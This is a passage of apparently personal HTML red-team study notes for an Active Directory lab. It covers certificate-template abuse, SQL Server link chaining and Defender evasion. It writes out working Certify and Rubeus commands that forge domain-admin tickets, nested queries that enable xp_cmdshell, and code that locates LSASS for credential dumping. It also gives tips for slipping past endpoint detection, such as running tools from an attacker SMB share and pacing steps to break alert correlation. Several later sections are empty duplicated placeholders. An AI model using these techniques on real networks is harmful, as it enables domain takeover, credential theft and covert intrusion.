+  3) Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it:<br />
+     <pre><code>Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt<br />
+     </code></pre>
+
+#### 💀 Escalation to EA
+
+1) Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the <code>SmartCardEnrollment-Users</code> template.<br />
+     <pre><code>Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123  <br />
+     </code></pre><br />
+  2) Request EA TGT and inject it:<br />
+     <pre><code>Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt<br />
+     </code></pre>
+
+#### 👹 ESC1
+
+1) The template <code>HTTPSCertificates</code> has ENROLLEE<em>SUPPLIES</em>SUBJECT value for <code>msPKI-Certificates-Name-Flag</code>.<br />
+     <pre><code>Certify.exe find /enrolleeSuppliesSubject <br />
+     </code></pre><br />
+  2) The template <code>HTTPSCertificates</code> allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx<br />
+     <pre><code>Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator <br />
+     </code></pre><br />
+  3) Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA)<br />
+     <pre><code>Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt<br />
+     </code></pre>
+</details><hr />
+
+
+<details>
+<summary>🫙 MSSQL Servers
+</summary>SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
+
+For MSSQL and PowerShell hackery, lets use  <a href="https://github.com/NetSPI/PowerUpSQL">GitHub - PowerUpSQL</a>
+
+#### 🔪 Commands 
+
+<ul>
+<li>Discovery (SPN Scanning)<br />
+<pre><code>Get-SQLInstanceDomain 
+</code></pre></li>
+<li>Check Accessibility<br />
+<pre><code>Get-SQLConnectionTestThreaded
+
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose 
+</code></pre></li>
+<li>Gather Information<br />
+  <pre><code>Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose 
+  </code></pre>
+
+<h4>🔗 Database Links</h4>
+
+A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.  
+
+In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures. 
+
+ℹ️ Database links work even across <strong>forest trusts</strong>.
+
+Searching Database Links
+
+1) Look for links to remote servers<br />
+   <pre><code>Get-SQLServerLink -Instance dcorp-mssql -Verbose <br />
+   </code></pre><br />
+   OR<br />
+   <pre><code>select * from master..sysservers<br />
+   </code></pre>
+
+Enumerating Database Links - <strong>Manually</strong>
+
+2) <code>Openquery()</code> function can be used to run queries on a linked database<br />
+   <pre><code>select * from openquery("dcorp-sql1",'select * from master..sysservers')<br />
+   </code></pre><br />
+3) Enumerating Database Links<br />
+   <pre><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose<br />
+   </code></pre><br />
+   OR
+
+<ul>
+<li><code>Openquery</code> queries can be chained to access links within links (nested links)<br />
+<pre><code>select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from master..sysservers'')')
+</code></pre></li>
+</ul>
+
+4) Executing Commands
+
+<ul>
+<li>On the target server, either <code>xp_cmdshell</code> should be already enabled; or If <code>rpcout</code> is enabled (disabled by default), <code>xp_cmdshell</code> can be enabled using:<br />
+<pre><code>EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
+</code></pre></li>
+<li>Use the <code>-QuertyTarget</code> parameter to run Query on a specific instance (without <code>-QueryTarget</code> the command tries to use <code>xp_cmdshell</code> on every link of the chain)<br />
+<pre><code>Get-SQLServerLinkCrawl -Instance dcorp-mssql  -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
+</code></pre></li>
+<li>From the initial SQL server, OS commands can be executed using nested link queries:<br />
+<pre><code>select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')')
+</code></pre></li>
+</ul></li>
+</ul>
+</details>
+</details><hr />
+<details>
+<summary>🏹 Bypassing Defenses (MDE and MDI)
+</summary><strong>Endpoint Detection and Response (EDRs)</strong> system protects individual devices (endpoints) by continuously monitoring for and responding to security threats. 
+
+ℹ️ It includes features for threat detection, incident response, investigation, and forensics, making it a vital component of modern cybersecurity strategies.
+
+ℹ️ <strong>MDE</strong> is an <strong>EDR</strong> and <strong>MDI</strong> is an <strong>identity threat detection and response (ITDR)</strong> solution
+
+In addition to standard EDR capabilities, MDE collects and processes behavioral signals from the OS and analyzes this using cloud security analytics. 
+
+MDE also supports detections based on the following technologies:<br />
+- Attack Surface Reduction rules<br />
+- Exploit protection<br />
+- Network protection<br />
+- Controlled Folder Access<br />
+- Device control
+
+Our objective is to remain undetected by AV and EDR on eu-sql to perform:<br />
+- SQL command execution through SQL Server links<br />
+- Tool transfer<br />
+- Credential extraction<br />
+- Data exfiltration<br />
+- Lateral movement / remote access
+
+<hr />
+
+
+<details>
+<summary>🖥️ Credential Extraction
+</summary>### 🧪 Credential Extraction – LSASS Dump
+
+<strong>⚠️ Direct LSASS Interaction Detection by MDE:</strong><br />
+  - Tools like <strong>Mimikatz</strong> using <code>sekurlsa::logonpasswords</code> are easily detected by <strong>Microsoft Defender for Endpoint (MDE)</strong>.<br />
+  - Standard dump techniques (e.g., via Task Manager → "Create Dump File") are <strong>monitored and blocked</strong>.
+
+<hr />
+
+<strong>🔐 Common Dumping Technique (Detected by EDR):</strong><br />
+  1. Gain a <strong>handle</strong> to the LSASS process.<br />
+  2. Call <code>MiniDumpWriteDump()</code> from <code>dbghelp.dll</code> or <code>dbgcore.dll</code>.<br />
+  3. Write the dump file to disk.
+
+<blockquote>
+  🛑 These steps are heavily monitored by <strong>EDRs like MDE</strong> and often result in detection.
+</blockquote>
+
+<hr />
+
+<strong>🕵️‍♂️ OPSEC-Friendly Alternative:</strong><br />
+  - Dump <strong>LSASS memory covertly</strong>, <strong>exfiltrate</strong>, then analyze <strong>offline</strong>.<br />
+  - Avoid tools that call <code>MiniDumpWriteDump()</code> directly.
+
+<hr />
+
+### 🔧 Custom API Approach – MiniDumpDotNet
+
+<ul>
+<li><strong>MiniDumpDotNet</strong> is a custom LSASS dumping tool: 
+
+<ul>
+<li>Reimplements <code>MiniDumpWriteDump</code> using <strong>BOF</strong> + <strong>ReactOS</strong> code.</li>
+<li>Avoids standard API calls to <strong>evade detection</strong>.</li>
+</ul>
+
+<a href="https://github.com/WhiteOakSecurity/MiniDumpDotNet">GitHub - MiniDumpDotNet</a>
+
+<strong>✅ Features:</strong></li>
+<li>Written in <strong>.NET CLR</strong>, supports:
+<ul>
+<li>Standalone execution</li>
+<li><code>assembly.load()</code></li>
+<li>PowerShell / JScript / VBS injection</li>
+</ul></li>
+<li>Can dump <strong>other processes</strong> too (e.g., Outlook with cleartext creds)</li>
+</ul>
+
+<hr />
+
+
+  **📥 Usage Example:**
+  <pre><code>.\minidumpdotnet.exe &lt;LSASS_PID&gt; &lt;minidump_file&gt;
+  </code></pre>
+
+  ### 🧪 Credential Extraction – LSASS Dump
+
+
+<hr />
+
+
+  ### ⚙️ MiniDumpDotNet Setup
+  <pre><code>git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git
+  </code></pre>
+
+<ul>
+<li>Built using <strong>Visual Studio 2015</strong> (or any VS version that supports C++ CLR)</li>
+<li>Generates:
+<ul>
+<li>Executable binary</li>
+<li>.NET class library</li>
+</ul></li>
+<li>Build via <code>Build → Build Solution</code> inside Visual Studio</li>
+</ul>
+
+<hr />
+
+
+  ### 🧪 AV Signature Testing – DefenderCheck
+  <pre><code>C:\AD\Tools\DefenderCheck&gt; .\DefenderCheck.exe .\minidumpdotnet.exe
+# [+] No threat found in submitted file!
+  </code></pre>
+
+<blockquote>
+  ✅ <strong>MDE does not detect</strong> <code>minidumpdotnet.exe</code> (at the time of test).
+
+</blockquote>
+
+<hr />
+
+### 🔎 Finding LSASS PID – OPSEC Safe Techniques
+
+<ul>
+<li><code>tasklist /v</code> and similar commands are monitored by <strong>MDE</strong></li>
+<li>Use <strong>WinAPI</strong> instead (more stealthy)</li>
+<li>If using RDP: Task Manager or UI alternatives are safer</li>
+</ul>
+
+<hr />
+
+### 💻 Example: C++ Code to Find LSASS PID<br />
+  <pre><code>int FindPID(const char* procname) {
+  int pid = 0;
+  PROCESSENTRY32 proc = {};
+  proc.dwSize = sizeof(PROCESSENTRY32);
+  HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  bool bProc = Process32First(snapshot, &amp;proc);
+  while (bProc) {
+    if (strcmp(procname, proc.szExeFile) == 0) {
+      pid = proc.th32ProcessID;
+      break;
+    }
+    bProc = Process32Next(snapshot, &amp;proc);
+  }
+  return pid;
+}
+  </code></pre>
+
+<blockquote>
+  ⚠️ Adding this to <code>MiniDumpDotNet</code> = 🔔 <strong>Detected by MDE</strong><br />
+  ✅ Running in <strong>standalone EXE</strong> = 🟢 <strong>No detection</strong><br />
+  <pre><code>C:\AD\Tools\DefenderCheck&gt; .\DefenderCheck.exe FindLSASSPID.exe
+# [+] No threat found in submitted file!
+  </code></pre>
+</blockquote>
+
+<hr />
+
+### 📦 Tool Transfer &amp; Execution (OPSEC Tips)
+
+<ul>
+<li>HTTP(S) downloads = 🚨 High detection risk</li>
+<li>Use legit binaries (e.g. <code>msedge.exe</code>) to download = lower risk</li>
+<li>Best practice:
+<ul>
+<li>Share tools via SMB</li>
+<li>Execute directly from shared path (<code>\\attacker\tools\minidump.exe</code>)</li>
+</ul></li>
+</ul>
+
+<hr />
+
+### 🧩 Breaking Detection Chains
+
+<ul>
+<li>EDRs <strong>correlate suspicious actions</strong> over short time windows</li>
+<li>To avoid detection:
+<ul>
+<li>⏳ Wait ~10 min between sensitive steps</li>
+<li>🧊 Mix benign actions (e.g., legit SQL queries) between suspicious ones</li>
+</ul></li>
+</ul>
+
+<hr />
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details>
+</details><hr />
+<details>
+<summary>🔎 Monitoring and Detections
+</summary><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details><hr />
+
+
+<details>
+<summary>🥈 AD CS – ESC1
+</summary>#### 🔪 Commands 
+</details>
+</details><hr />
+
+<hr />
+<details>
+<summary><span style="font-weight: bold;">🧬 Living off the Land (LOTL)</span>
+</summary><h3>🧠 What Is LOTL?</h3>
+
+<strong>Living off the Land (LOTL)</strong> refers to attackers abusing <strong>legitimate, built-in system tools</strong> (often called <em>LOLBins</em>, short for <em>Living Off the Land Binaries</em>) to perform malicious actions without using traditional malware.
+
+These techniques allow attackers to:<br />
+- Blend into normal admin activity<br />
+- Bypass antivirus and EDR<br />
+- Stay fileless and reduce their forensic footprint
+
+<hr />
+
+<h3>🧰 Common LOLBins in Windows</h3>
+
+<table>
+<thead>
+<tr>
+  <th>Binary</th>
+  <th>Purpose / Abuse</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td><code>powershell.exe</code></td>
+  <td>Script execution, memory injection, download payloads</td>
+</tr>
+<tr>
+  <td><code>cmd.exe</code></td>
+  <td>Basic shell access and command execution</td>
+</tr>
+<tr>
+  <td><code>wmic.exe</code></td>
+  <td>System info, user queries, process execution</td>
+</tr>
+<tr>
+  <td><code>rundll32.exe</code></td>
+  <td>Run DLLs or hidden payloads</td>
+</tr>
+<tr>
+  <td><code>mshta.exe</code></td>
+  <td>Run HTA (HTML Applications), supports remote execution</td>
+</tr>
+<tr>
+  <td><code>regsvr32.exe</code></td>
+  <td>Execute scripts from COM scriptlets (.sct files)</td>
+</tr>
+<tr>
+  <td><code>certutil.exe</code></td>
+  <td>Downloading files, base64 encoding/decoding</td>
+</tr>
+<tr>
+  <td><code>bitsadmin.exe</code></td>
+  <td>Download payloads using Background Intelligent Transfer Service (deprecated)</td>
+</tr>
+<tr>
+  <td><code>curl.exe</code> / <code>Invoke-WebRequest</code></td>
+  <td>Network comms and file downloads</td>
+</tr>
+<tr>
+  <td><code>taskschd.msc</code> / <code>schtasks.exe</code></td>
+  <td>Establish persistence with scheduled tasks</td>
+</tr>
+</tbody>
+</table>
+
+<hr />
+
+<h3>🔥 Example: LOTL for Enumeration</h3>
+
+<pre><code>wmic process get name,executablepath,processid /format:list > %temp%\sys_log.txt & attrib +h %temp%\sys_log.txt
+</code></pre>
+</details><hr />
+
+</div>
+</body>
+</html>
